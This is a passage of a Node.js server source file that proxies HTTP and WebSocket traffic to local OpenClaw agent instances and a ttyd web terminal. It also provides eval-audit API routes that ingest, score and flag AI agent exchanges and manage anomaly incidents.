    log.info('Auto-approved device pairing', { connection: conn.name, pendingCount: pending.length });
    return jsonResponse(res, 200, { approved: true, count: pending.length });
  } catch (err) {
    log.warn('Auto-approve: failed to approve', { error: err.message });
    return jsonResponse(res, 200, { approved: false, reason: `Approve failed: ${err.message}` });
  }
});

// ── OpenClaw Proxy ──

/**
 * Resolve the local port for an OpenClaw connection from a project name.
 * @param {string} projectName - Project name
 * @returns {{ localPort: number, conn: object }|null}
 */
function resolveOpenclawPort(projectName) {
  const project = store.projects.getByName(projectName);
  if (!project) return null;
  const engineId = project.engineId;
  if (!engineId || !engineId.startsWith('openclaw:')) return null;
  const connId = engineId.split(':')[1];
  const conn = store.openclawConnections.get(connId);
  if (!conn) return null;
  return { localPort: conn.localPort, conn };
}

/**
 * Resolve the local port for a standalone OpenClaw connection by ID.
 * @param {string} connId - Connection ID
 * @returns {{ localPort: number, conn: object }|null}
 */
function resolveOpenclawPortDirect(connId) {
  const conn = store.openclawConnections.get(connId);
  if (!conn) return null;
  return { localPort: conn.localPort, conn };
}

/**
 * Strip frame-blocking headers from proxied OpenClaw responses so the UI can load in an iframe.
 * @param {object} headers - Response headers from upstream
 * @returns {object}
 */
function _stripFrameBlockers(headers) {
  const out = { ...headers };
  delete out['x-frame-options'];
  if (out['content-security-policy']) {
    out['content-security-policy'] = out['content-security-policy']
      .replace(/frame-ancestors\s+[^;]+;?\s*/g, '');
  }
  return out;
}

/**
 * Build proxy headers for OpenClaw requests, rewriting origin/referer to match the target
 * and injecting the gateway token for server-side auth.
 * @param {object} headers - Original request headers
 * @param {number} localPort - Target local port
 * @param {string|null} [gatewayToken] - Gateway bearer token
 * @returns {object}
 */
function _openclawProxyHeaders(headers, localPort, gatewayToken) {
  const out = { ...headers, host: `127.0.0.1:${localPort}` };
  const localOrigin = `http://127.0.0.1:${localPort}`;
  if (out.origin) out.origin = localOrigin;
  if (out.referer) out.referer = localOrigin + '/';
  if (gatewayToken) out.authorization = `Bearer ${gatewayToken}`;
  return out;
}

/**
 * Proxy an HTTP request to an OpenClaw instance via its local tunnel port.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 * @param {string} projectName - Project name from URL
 * @param {string} subPath - Remaining path after /openclaw/:project/
 */
function proxyToOpenclaw(req, res, projectName, subPath) {
  const resolved = resolveOpenclawPort(projectName);
  if (!resolved) {
    return errorResponse(res, 404, 'OpenClaw connection not found for project', 'NOT_FOUND');
  }

  const { localPort } = resolved;
  const targetPath = '/' + subPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : '');

  const proxyReq = http.request({
    hostname: '127.0.0.1',
    port: localPort,
    path: targetPath,
    method: req.method,
    headers: _openclawProxyHeaders(req.headers, localPort, resolved.conn.gatewayToken)
  }, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, _stripFrameBlockers(proxyRes.headers));
    proxyRes.pipe(res);
  });

  proxyReq.on('error', (err) => {
    log.warn('OpenClaw proxy error', { error: err.message, project: projectName });
    errorResponse(res, 502, 'OpenClaw service unavailable', 'BAD_GATEWAY');
  });

  req.pipe(proxyReq);
}

// ── Terminal Proxy ──

/**
 * Proxy an HTTP request to the ttyd backend.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 * @param {string} pathname
 */
function proxyToTtyd(req, res, pathname) {
  const config = store.config.load();
  const target = caddy.ttydConnectTarget(config);
  const targetPath = pathname.replace(/^\/terminal/, '') || '/';

  // In caddy mode ttyd is on a Unix socket (`socketPath`); otherwise a TCP port.
  // http.request accepts either `socketPath` or `hostname`+`port`.
  const reqOptions = {
    path: targetPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : ''),
    method: req.method,
    headers: {
      ...req.headers,
      host: target.hostHeader
    }
  };
  if (target.socketPath) {
    reqOptions.socketPath = target.socketPath;
  } else {
    reqOptions.hostname = target.host;
    reqOptions.port = target.port;
  }

  const proxyReq = http.request(reqOptions, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', (err) => {
    log.warn('ttyd proxy error', { error: err.message });
    errorResponse(res, 502, 'Terminal service unavailable', 'BAD_GATEWAY');
  });

  req.pipe(proxyReq);
}

/**
 * Handle WebSocket upgrade for terminal proxy.
 * @param {http.IncomingMessage} req
 * @param {import('net').Socket} socket
 * @param {Buffer} head
 */
function handleUpgrade(req, socket, head) {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

  // OpenClaw direct WebSocket proxy — /openclaw-direct/:connId/*
  if (urlObj.pathname.startsWith('/openclaw-direct/')) {
    const parts = urlObj.pathname.split('/'); // ['', 'openclaw-direct', connId, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const connId = decodeURIComponent(parts[2]);
      const resolved = resolveOpenclawPortDirect(connId);
      if (!resolved) {
        socket.destroy();
        return;
      }
      const subPath = parts.slice(3).join('/');
      const targetUrl = '/' + subPath + (urlObj.search || '');

      const net = require('node:net');
      const proxySocket = net.connect(resolved.localPort, '127.0.0.1', () => {
        const localOrigin = `http://127.0.0.1:${resolved.localPort}`;
        const reqHeaders = [];
        reqHeaders.push(`GET ${targetUrl} HTTP/1.1`);
        reqHeaders.push(`Host: 127.0.0.1:${resolved.localPort}`);
        let hasAuth = false;
        for (const [key, value] of Object.entries(req.headers)) {
          const k = key.toLowerCase();
          if (k === 'host') continue;
          if (k === 'origin') { reqHeaders.push(`origin: ${localOrigin}`); continue; }
          if (k === 'referer') { reqHeaders.push(`referer: ${localOrigin}/`); continue; }
          if (k === 'authorization') { hasAuth = true; }
          reqHeaders.push(`${key}: ${value}`);
        }
        if (!hasAuth && resolved.conn.gatewayToken) {
          reqHeaders.push(`authorization: Bearer ${resolved.conn.gatewayToken}`);
        }
        reqHeaders.push('', '');

        proxySocket.write(reqHeaders.join('\r\n'));
        if (head.length > 0) {
          proxySocket.write(head);
        }

        proxySocket.pipe(socket);
        socket.pipe(proxySocket);
      });

      proxySocket.on('error', () => socket.destroy());
      socket.on('error', () => proxySocket.destroy());
      socket.on('close', () => proxySocket.destroy());
      proxySocket.on('close', () => socket.destroy());
      return;
    }
    socket.destroy();
    return;
  }

  // OpenClaw WebSocket proxy — /openclaw/:project/*
  if (urlObj.pathname.startsWith('/openclaw/')) {
    const parts = urlObj.pathname.split('/'); // ['', 'openclaw', project, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const ocProject = decodeURIComponent(parts[2]);
      const resolved = resolveOpenclawPort(ocProject);
      if (!resolved) {
        socket.destroy();
        return;
      }
      const subPath = parts.slice(3).join('/');
      const targetUrl = '/' + subPath + (urlObj.search || '');

      const net = require('node:net');
      const proxySocket = net.connect(resolved.localPort, '127.0.0.1', () => {
        const localOrigin = `http://127.0.0.1:${resolved.localPort}`;
        const reqHeaders = [];
        reqHeaders.push(`GET ${targetUrl} HTTP/1.1`);
        reqHeaders.push(`Host: 127.0.0.1:${resolved.localPort}`);
        let hasAuth = false;
        for (const [key, value] of Object.entries(req.headers)) {
          const k = key.toLowerCase();
          if (k === 'host') continue;
          if (k === 'origin') { reqHeaders.push(`origin: ${localOrigin}`); continue; }
          if (k === 'referer') { reqHeaders.push(`referer: ${localOrigin}/`); continue; }
          if (k === 'authorization') { hasAuth = true; }
          reqHeaders.push(`${key}: ${value}`);
        }
        if (!hasAuth && resolved.conn.gatewayToken) {
          reqHeaders.push(`authorization: Bearer ${resolved.conn.gatewayToken}`);
        }
        reqHeaders.push('', '');

        proxySocket.write(reqHeaders.join('\r\n'));
        if (head.length > 0) {
          proxySocket.write(head);
        }

        proxySocket.pipe(socket);
        socket.pipe(proxySocket);
      });

      proxySocket.on('error', () => socket.destroy());
      socket.on('error', () => proxySocket.destroy());
      socket.on('close', () => proxySocket.destroy());
      proxySocket.on('close', () => socket.destroy());
      return;
    }
    socket.destroy();
    return;
  }

  if (!urlObj.pathname.startsWith('/terminal')) {
    socket.destroy();
    return;
  }

  const config = store.config.load();
  const target = caddy.ttydConnectTarget(config);
  const targetPath = urlObj.pathname.replace(/^\/terminal/, '') || '/';
  const targetUrl = targetPath + (urlObj.search || '');

  const net = require('node:net');
  // caddy mode → Unix socket; direct mode → TCP host:port. net.connect accepts
  // a socket path (string) or (port, host).
  const onProxyConnect = () => {
    // Build the upgrade request to forward to ttyd
    const reqHeaders = [];
    reqHeaders.push(`GET ${targetUrl} HTTP/1.1`);
    reqHeaders.push(`Host: ${target.hostHeader}`);
    for (const [key, value] of Object.entries(req.headers)) {
      if (key.toLowerCase() === 'host') continue;
      reqHeaders.push(`${key}: ${value}`);
    }
    reqHeaders.push('', '');

    proxySocket.write(reqHeaders.join('\r\n'));
    if (head.length > 0) {
      proxySocket.write(head);
    }

    // Pipe data bidirectionally
    proxySocket.pipe(socket);
    socket.pipe(proxySocket);
  };

  const proxySocket = target.socketPath
    ? net.connect(target.socketPath, onProxyConnect)
    : net.connect(target.port, target.host, onProxyConnect);

  proxySocket.on('error', () => {
    socket.destroy();
  });

  socket.on('error', () => {
    proxySocket.destroy();
  });

  socket.on('close', () => {
    proxySocket.destroy();
  });

  proxySocket.on('close', () => {
    socket.destroy();
  });
}

// ── Version Helper ──

let _cachedVersion = null;

/**
 * Read the version from version.json.
 * @returns {string}
 */
function _getVersion() {
  if (_cachedVersion) return _cachedVersion;
  try {
    const versionFile = path.join(__dirname, 'version.json');
    const data = JSON.parse(fs.readFileSync(versionFile, 'utf8'));
    _cachedVersion = data.version;
    return _cachedVersion;
  } catch {
    return 'unknown';
  }
}

// ── Request Handler ──

/**
 * Main HTTP request handler.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 */
async function handleRequest(req, res) {
  const startTime = Date.now();
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = urlObj.pathname;
  const method = req.method.toUpperCase();

  // API routes
  if (pathname.startsWith('/api/')) {
    const matched = matchRoute(method, pathname);
    if (!matched) {
      log.debug('Route not found', { method, path: pathname });
      return errorResponse(res, 404, `${method} ${pathname} not found`, 'NOT_FOUND');
    }

    // AUTH-4 — M2M service-token gate on the PortHub + shared-docs surfaces. A
    // no-op when serviceTokenEnabled is false (default), so the surfaces stay
    // byte-for-byte open until the operator opts in.
    if (serviceToken.requiresServiceToken(pathname)) {
      const gate = serviceToken.validateRequest(req.headers, store.config.load());
      if (!gate.ok) {
        // Log the denial (never the token) — the gate returns before the normal
        // access-log line below, so without this a rejected M2M caller leaves no
        // trace for the operator to debug.
        log.warn('Service-token gate denied request', { method, path: pathname, code: gate.code });
        return errorResponse(res, gate.status, gate.message, gate.code);
      }
    }

    try {
      const body = await parseBody(req, matched.options.maxBodySize);
      await matched.handler(req, res, matched.params, body);
    } catch (err) {
      if (err.status) {
        return errorResponse(res, err.status, err.message, err.code);
      }
      log.error('Unhandled error in route handler', {
        method, path: pathname, error: err.message, stack: err.stack
      });
      return errorResponse(res, 500, 'Internal server error', 'INTERNAL_ERROR');
    }

    const duration = Date.now() - startTime;
    log.info(`${method} ${pathname}`, { status: res.statusCode, duration: `${duration}ms` });
    return;
  }

  // Terminal reverse proxy — forward /terminal/* to ttyd
  if (pathname.startsWith('/terminal/') || pathname === '/terminal') {
    if (method === 'GET' || method === 'POST') {
      return proxyToTtyd(req, res, pathname);
    }
  }

  // OpenClaw direct proxy — forward /openclaw-direct/:connId/* to local tunnel port (standalone)
  if (pathname.startsWith('/openclaw-direct/')) {
    const parts = pathname.split('/'); // ['', 'openclaw-direct', connId, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const connId = decodeURIComponent(parts[2]);
      const resolved = resolveOpenclawPortDirect(connId);
      if (!resolved) {
        return errorResponse(res, 404, 'OpenClaw connection not found', 'NOT_FOUND');
      }
      const subPath = parts.slice(3).join('/');
      const targetPath = '/' + subPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : '');

      const proxyReq = http.request({
        hostname: '127.0.0.1',
        port: resolved.localPort,
        path: targetPath,
        method: req.method,
        headers: _openclawProxyHeaders(req.headers, resolved.localPort, resolved.conn.gatewayToken)
      }, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, _stripFrameBlockers(proxyRes.headers));
        proxyRes.pipe(res);
      });

      proxyReq.on('error', (err) => {
        log.warn('OpenClaw direct proxy error', { error: err.message, connId });
        errorResponse(res, 502, 'OpenClaw service unavailable', 'BAD_GATEWAY');
      });

      req.pipe(proxyReq);
      return;
    }
  }

  // OpenClaw reverse proxy — forward /openclaw/:project/* to local tunnel port
  if (pathname.startsWith('/openclaw/')) {
    const parts = pathname.split('/'); // ['', 'openclaw', project, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const ocProject = decodeURIComponent(parts[2]);
      const subPath = parts.slice(3).join('/');
      return proxyToOpenclaw(req, res, ocProject, subPath);
    }
  }

  // Static files
  if (method === 'GET') {
    if (serveStatic(res, pathname)) {
      const duration = Date.now() - startTime;
      log.debug(`${method} ${pathname}`, { status: 200, duration: `${duration}ms` });
      return;
    }
  }

  // Session wrapper page — /session/:name serves session.html
  if (method === 'GET' && pathname.startsWith('/session/') && pathname.split('/').length === 3) {
    const sessionName = pathname.split('/')[2];
    if (sessionName && serveStatic(res, '/session.html')) {
      return;
    }
  }

  // OpenClaw viewer page — /openclaw-view/:connId serves openclaw-view.html
  if (method === 'GET' && pathname.startsWith('/openclaw-view/') && pathname.split('/').length === 3) {
    const connId = pathname.split('/')[2];
    if (connId && serveStatic(res, '/openclaw-view.html')) {
      return;
    }
  }

  // Fallback: serve index.html for SPA routing
  if (method === 'GET' && !pathname.includes('.')) {
    if (serveStatic(res, '/')) {
      return;
    }
  }

  errorResponse(res, 404, 'Not found', 'NOT_FOUND');
}

// ── Eval Audit Mode ──

// Debounced incident generation — max once per 60s per project
const _incidentGenerationTimestamps = {};

/**
 * Run incident generation for a project if not run in the last 60 seconds.
 * @param {string} project - Project name
 */
function _maybeGenerateIncidents(project) {
  const now = Date.now();
  const lastRun = _incidentGenerationTimestamps[project] || 0;
  if (now - lastRun < 60000) return;
  _incidentGenerationTimestamps[project] = now;
  try {
    evalAudit.generateIncidents(project, store);
  } catch (err) {
    log.error('Incident generation failed', { project, error: err.message });
  }
}

// POST /api/audit/ingest — Receive exchange data from OpenClaw webhook
route('POST', '/api/audit/ingest', (_req, res, _params, body) => {
  // Authenticate via Bearer token
  const authHeader = _req.headers['authorization'] || '';
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;

  if (!token) {
    return errorResponse(res, 401, 'Missing Authorization header', 'UNAUTHORIZED');
  }

  // Find the connection by matching audit_secret
  const connections = store.openclawConnections.list();
  const conn = connections.find(c => c.auditSecret && c.auditSecret === token);
  if (!conn) {
    return errorResponse(res, 401, 'Invalid audit token', 'UNAUTHORIZED');
  }

  // Validate payload
  const validation = evalAudit.validateIngestPayload(body);
  if (!validation.valid) {
    return errorResponse(res, 400, validation.error, 'BAD_REQUEST');
  }

  // Resolve project from connection (find projects using this connection as engine)
  const projects = store.projects.list();
  const project = projects.find(p => p.engineId === `openclaw:${conn.id}`);
  const projectName = project ? project.name : (body.project || 'unknown');

  // Transform and store the exchange
  const exchangeData = evalAudit.transformIngestPayload(body, projectName);
  const exchange = store.evalExchanges.insert(exchangeData);

  // Record heartbeat for watchdog
  evalAudit.heartbeat(body.session_id);

  // Load methodology eval dimensions for Tier 1 scoring
  let evalDims = evalAudit.DEFAULT_EVAL_DIMENSIONS;
  if (project) {
    try {
      const template = store.templates.get(project.methodology);
      if (template) evalDims = evalAudit.getEvalDimensions(template);
    } catch { /* use defaults */ }
  }

  // Determine if this exchange should be scored (sampling)
  const projectConfig = project
    ? store.projectConfig.load(project.path)
    : store.DEFAULT_PROJECT_CONFIG;
  const auditConfig = projectConfig.evalAuditMode || {};
  const samplingConfig = auditConfig.sampling || {};

  // Run Tier 1 (always — it's free)
  const tier1Result = evalAudit.runTier1(
    { userMessage: exchange.userMessage, agentResponse: exchange.agentResponse, agentThinking: exchange.agentThinking },
    evalDims.tier1 || []
  );

  // Decide if we should score beyond Tier 1
  const samplingDecision = evalAudit.shouldScore(
    exchange,
    samplingConfig,
    { tier1Flags: tier1Result.flags }
  );

  // Cost cap enforcement — skip paid tiers if session cost exceeds cap
  const costCap = auditConfig.costCapPerSession || 1.00;
  const sessionCost = store.evalScores.getSessionCost(body.session_id);
  const costCapResult = evalAudit.checkCostCap(sessionCost, costCap);

  if (costCapResult.exceeded && samplingDecision.shouldScore) {
    // Store Tier 1 only (free), mark as cost-cap-skipped
    store.evalExchanges.updateScored(exchange.id, 3);

    if (tier1Result.flags.length > 0) {
      store.evalScores.insert({
        exchangeId: exchange.id,
        schemaVersion: evalDims.schemaVersion || 'default-v1',
        judgeModel: 'structural',
        scoredAt: new Date().toISOString(),
        methodology: project ? project.methodology : null,
        tier1StructuralScore: tier1Result.score,
        tier1Flags: tier1Result.flags,
        tier2Skipped: true,
        tier2_5Skipped: true,
        tier3Skipped: true,
        anomalyFlag: true,
        anomalyReason: `Structural: ${tier1Result.flags.join(', ')}`,
        costUsd: 0
      });
    }

    return jsonResponse(res, 201, {
      exchangeId: exchange.id,
      scored: false,
      reason: 'cost_cap_exceeded',
      tier1: tier1Result,
      costCap: { currentCost: costCapResult.currentCost, cap: costCapResult.cap }
    });
  }

  if (!samplingDecision.shouldScore) {
    // Mark as skipped (sampling) but still store Tier 1 result
    store.evalExchanges.updateScored(exchange.id, 2);

    // Store Tier 1-only score if there were flags
    if (tier1Result.flags.length > 0) {
      store.evalScores.insert({
        exchangeId: exchange.id,
        schemaVersion: evalDims.schemaVersion || 'default-v1',
        judgeModel: 'structural',
        scoredAt: new Date().toISOString(),
        methodology: project ? project.methodology : null,
        tier1StructuralScore: tier1Result.score,
        tier1Flags: tier1Result.flags,
        tier2Skipped: true,
        tier2_5Skipped: true,
        tier3Skipped: true,
        anomalyFlag: tier1Result.flags.length > 0,
        anomalyReason: tier1Result.flags.length > 0 ? `Structural: ${tier1Result.flags.join(', ')}` : null,
        costUsd: 0
      });
      store.evalExchanges.updateScored(exchange.id, 1);
    }

    return jsonResponse(res, 201, {
      exchangeId: exchange.id,
      scored: false,
      reason: samplingDecision.reason,
      tier1: tier1Result
    });
  }

  // Insert initial Tier 1 score record
  const scoreRecord = store.evalScores.insert({
    exchangeId: exchange.id,
    schemaVersion: evalDims.schemaVersion || 'default-v1',
    judgeModel: auditConfig.judgeModel || 'claude-haiku-4-5-20251001',
    scoredAt: new Date().toISOString(),
    methodology: project ? project.methodology : null,
    tier1StructuralScore: tier1Result.score,
    tier1Flags: tier1Result.flags,
    tier2Skipped: true,
    tier2_5Skipped: true,
    tier3Skipped: true,
    anomalyFlag: tier1Result.flags.length > 0,
    anomalyReason: tier1Result.flags.length > 0 ? `Structural: ${tier1Result.flags.join(', ')}` : null,
    costUsd: 0
  });

  store.evalExchanges.updateScored(exchange.id, 1);

  // Send immediate response with Tier 1 results (non-blocking)
  jsonResponse(res, 201, {
    exchangeId: exchange.id,
    scoreId: scoreRecord.id,
    scored: true,
    reason: samplingDecision.reason,
    tier1: tier1Result,
    anomaly: tier1Result.flags.length > 0
  });

  // Run Tier 2/2.5/3 pipeline asynchronously (does not block the response)
  evalAudit.runScoringPipeline({
    exchange: { userMessage: exchange.userMessage, agentResponse: exchange.agentResponse, agentThinking: exchange.agentThinking, turnNumber: exchange.turnNumber },
    tier1Result,
    evalDims,
    samplingReason: samplingDecision.reason,
    options: {
      callJudge: auditConfig._callJudge || undefined,
      model: auditConfig.judgeModel,
      apiKey: auditConfig.apiKey,
      gateCascade: auditConfig.gateCascade !== false
    }
  }).then(pipelineResult => {
    // Update the score record with Tier 2/2.5/3 results
    const updateData = { costUsd: pipelineResult.totalCost };

    if (pipelineResult.tier2) {
      updateData.tier2SemanticScore = pipelineResult.tier2.score;
      updateData.tier2Reasoning = pipelineResult.tier2.reasoning;
      updateData.tier2Skipped = false;
      updateData.judgeModel = auditConfig.judgeModel || 'claude-haiku-4-5-20251001';
    }

    if (pipelineResult.tier2_5) {
      updateData.tier2_5AlignmentScore = pipelineResult.tier2_5.alignmentScore;
      updateData.tier2_5Reasoning = pipelineResult.tier2_5.reasoning;
      updateData.tier2_5Skipped = false;
    } else {
      updateData.tier2_5Skipped = true;
    }

    if (pipelineResult.tier3) {
      updateData.tier3BehavioralScore = pipelineResult.tier3.score;
      updateData.tier3DimensionScores = pipelineResult.tier3.dimensionScores;
      updateData.tier3Skipped = false;
    } else {
      updateData.tier3Skipped = true;
    }

    // Re-check anomaly with full scoring data
    const fullAnomaly = evalAudit.checkPerExchangeAnomaly({
      tier1Flags: tier1Result.flags,
      tier3DimensionScores: pipelineResult.tier3 ? pipelineResult.tier3.dimensionScores : null,
      tier2_5AlignmentScore: pipelineResult.tier2_5 ? pipelineResult.tier2_5.alignmentScore : null
    });
    updateData.anomalyFlag = fullAnomaly.anomaly;
    updateData.anomalyReason = fullAnomaly.anomaly ? fullAnomaly.reasons.join('; ') : null;

    store.evalScores.update(scoreRecord.id, updateData);

    // Debounced incident generation (max once per minute per project)
    _maybeGenerateIncidents(projectName);
  }).catch(err => {
    log.error('Async scoring pipeline failed', { exchangeId: exchange.id, error: err.message });
  });
}, { maxBodySize: 512 * 1024 });

// ── Sidecar: OpenClaw Process Visibility ──

// GET /api/sidecar/:project/processes — Get cached process state for an OpenClaw project
route('GET', '/api/sidecar/:project/processes', (_req, res, params) => {
  const projectName = params.project;
  const state = sidecar.getProcessesForProject(projectName);

  if (!state.connectionId) {
    return errorResponse(res, 404, `Project "${projectName}" is not an OpenClaw project`, 'NOT_FOUND');
  }

  // Ensure polling is running for this connection
  if (!sidecar._pollers.has(state.connectionId)) {
    sidecar.startPolling(state.connectionId);
  }

  jsonResponse(res, 200, {
    active: state.processes ? (state.processes.active || []) : [],
    recent: state.processes ? (state.processes.recent || []) : [],
    lastPollAt: state.lastPollAt,
    stale: state.stale,
    error: state.error
  });
});

// GET /api/sidecar/connection/:connId/processes — Get cached process state by connection ID (direct connect)
route('GET', '/api/sidecar/connection/:connId/processes', (_req, res, params) => {
  const connId = params.connId;
  const state = sidecar.getProcessesByConnection(connId);

  if (state.error === 'Connection not found') {
    return errorResponse(res, 404, `Connection "${connId}" not found`, 'NOT_FOUND');
  }

  // Ensure polling is running for this connection
  if (!sidecar._pollers.has(connId)) {
    sidecar.startPolling(connId);
  }

  jsonResponse(res, 200, {
    active: state.active,
    recent: state.recent,
    lastPollAt: state.lastPollAt,
    stale: state.stale,
    error: state.error
  });
});

// POST /api/audit/heartbeat — Lightweight heartbeat from OpenClaw
route('POST', '/api/audit/heartbeat', (_req, res, _params, body) => {
  if (!body || !body.session_id) {
    return errorResponse(res, 400, 'Missing session_id', 'BAD_REQUEST');
  }
  evalAudit.heartbeat(body.session_id);
  return jsonResponse(res, 200, { ok: true });
});

// GET /api/audit/telemetry — Heartbeat status for all active sessions
route('GET', '/api/audit/telemetry', (_req, res) => {
  const statuses = evalAudit.getTelemetryStatus();
  return jsonResponse(res, 200, { sessions: statuses });
});

// GET /api/audit/:project/scores — Query scores for a project
route('GET', '/api/audit/:project/scores', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  try {
    const scores = store.evalScores.listByProject(params.project, {
      from: query.from || null,
      to: query.to || null,
      anomaliesOnly: query.anomalies === 'true',
      limit: query.limit ? parseInt(query.limit, 10) : 100
    });
    return jsonResponse(res, 200, { scores, count: scores.length });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/anomalies — Anomaly log for a project
route('GET', '/api/audit/:project/anomalies', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  try {
    const anomalies = store.evalScores.listByProject(params.project, {
      from: query.from || null,
      to: query.to || null,
      anomaliesOnly: true,
      limit: query.limit ? parseInt(query.limit, 10) : 100
    });
    return jsonResponse(res, 200, { anomalies, count: anomalies.length });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/summary — Current period summary
route('GET', '/api/audit/:project/summary', (_req, res, params) => {
  try {
    const project = params.project;
    const exchanges = store.evalExchanges.list({ project });
    const scored = exchanges.filter(e => e.scored === 1).length;
    const pending = exchanges.filter(e => e.scored === 0).length;
    const skippedSampling = exchanges.filter(e => e.scored === 2).length;
    const skippedCostCap = exchanges.filter(e => e.scored === 3).length;

    const scores = store.evalScores.listByProject(project);
    const anomalyCount = scores.filter(s => s.anomalyFlag).length;

    // Compute average Tier 1 score
    const tier1Scores = scores
      .filter(s => s.tier1StructuralScore !== null && s.tier1StructuralScore !== undefined)
      .map(s => s.tier1StructuralScore);
    const avgTier1 = tier1Scores.length > 0
      ? tier1Scores.reduce((a, b) => a + b, 0) / tier1Scores.length
      : null;

    const baseline = store.evalBaselines.getLatest(project);

    return jsonResponse(res, 200, {
      project,
      exchanges: {
        total: exchanges.length,
        scored,
        pending,
        skippedSampling,
        skippedCostCap
      },
      scores: {
        total: scores.length,
        anomalies: anomalyCount,
        avgTier1Structural: avgTier1 !== null ? Math.round(avgTier1 * 1000) / 1000 : null
      },
      baseline: baseline ? {
        computedAt: baseline.computedAt,
        exchangeCount: baseline.exchangeCount,
        schemaVersion: baseline.schemaVersion
      } : null
    });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/baseline — Current baseline
route('GET', '/api/audit/:project/baseline', (_req, res, params) => {
  try {
    const baseline = store.evalBaselines.getLatest(params.project);
    if (!baseline) {
      return jsonResponse(res, 200, { baseline: null, message: 'No baseline computed yet' });
    }
    return jsonResponse(res, 200, { baseline });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/trends — Aggregated score trends over time
route('GET', '/api/audit/:project/trends', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  try {
    const window = query.window || '14d';
    const scores = store.evalScores.listByProject(params.project, { limit: 10000 });
    const trends = evalAudit.aggregateTrends(scores, window);
    return jsonResponse(res, 200, { project: params.project, ...trends });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/wrap-quality — Wrap quality scores for recent sessions
route('GET', '/api/audit/:project/wrap-quality', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  try {
    const limit = query.limit ? parseInt(query.limit, 10) : 10;
    const sessions = store.evalExchanges.listSessions(params.project, { limit });

    // Resolve methodology template for wrap step definitions
    const projects = store.projects.list();
    const project = projects.find(p => p.name === params.project);
    let methodology = null;
    if (project) {
      try { methodology = store.templates.get(project.methodology); } catch { /* use null */ }
    }

    const results = sessions.map(sess => {
      // Get last 5 exchanges for this session
      const exchanges = store.evalExchanges.list({
        project: params.project,
        sessionId: sess.sessionId
      }).slice(-5);

      const quality = evalAudit.scoreWrapQuality(exchanges, methodology);
      return {
        sessionId: sess.sessionId,
        exchangeCount: sess.exchangeCount,
        lastTimestamp: sess.lastTimestamp,
        ...quality
      };
    });

    return jsonResponse(res, 200, { project: params.project, sessions: results });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// POST /api/audit/:project/baseline/recompute — Recompute baseline from recent scores
route('POST', '/api/audit/:project/baseline/recompute', (req, res, params, body) => {
  try {
    const window = (body && body.window) || '14d';
    const baseline = evalAudit.computeBaseline(params.project, store, { window });
    if (!baseline) {
      return jsonResponse(res, 200, { baseline: null, message: 'No scores found in window to compute baseline' });
    }
    return jsonResponse(res, 200, { baseline });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/incidents — List incidents
route('GET', '/api/audit/:project/incidents', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  try {
    const options = {};
    if (query.status) options.status = query.status;
    if (query.type) options.type = query.type;
    if (query.limit) options.limit = parseInt(query.limit, 10);
    const incidents = store.evalIncidents.list(params.project, options);
    return jsonResponse(res, 200, { project: params.project, incidents });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// GET /api/audit/:project/incidents/:id — Get single incident
route('GET', '/api/audit/:project/incidents/:id', (_req, res, params) => {
  try {
    const incident = store.evalIncidents.get(params.id);
    if (!incident || incident.project !== params.project) {
      return errorResponse(res, 404, 'Incident not found', 'NOT_FOUND');
    }
    return jsonResponse(res, 200, { incident });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// PUT /api/audit/:project/incidents/:id — Update incident (accept/dismiss)
route('PUT', '/api/audit/:project/incidents/:id', (_req, res, params, body) => {
  try {
    const existing = store.evalIncidents.get(params.id);
    if (!existing || existing.project !== params.project) {
      return errorResponse(res, 404, 'Incident not found', 'NOT_FOUND');
    }
    if (!body || !body.status) {
      return errorResponse(res, 400, 'Missing status field', 'VALIDATION');
    }
    const validStatuses = ['open', 'accepted', 'dismissed'];
    if (!validStatuses.includes(body.status)) {
      return errorResponse(res, 400, `Invalid status: ${body.status}. Must be one of: ${validStatuses.join(', ')}`, 'VALIDATION');
    }
    const updateData = { status: body.status };
    if (body.status !== 'open') {
      updateData.resolvedAt = new Date().toISOString();
      updateData.resolvedBy = body.resolvedBy || 'user';
    }
    const updated = store.evalIncidents.update(params.id, updateData);
    return jsonResponse(res, 200, { incident: updated });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

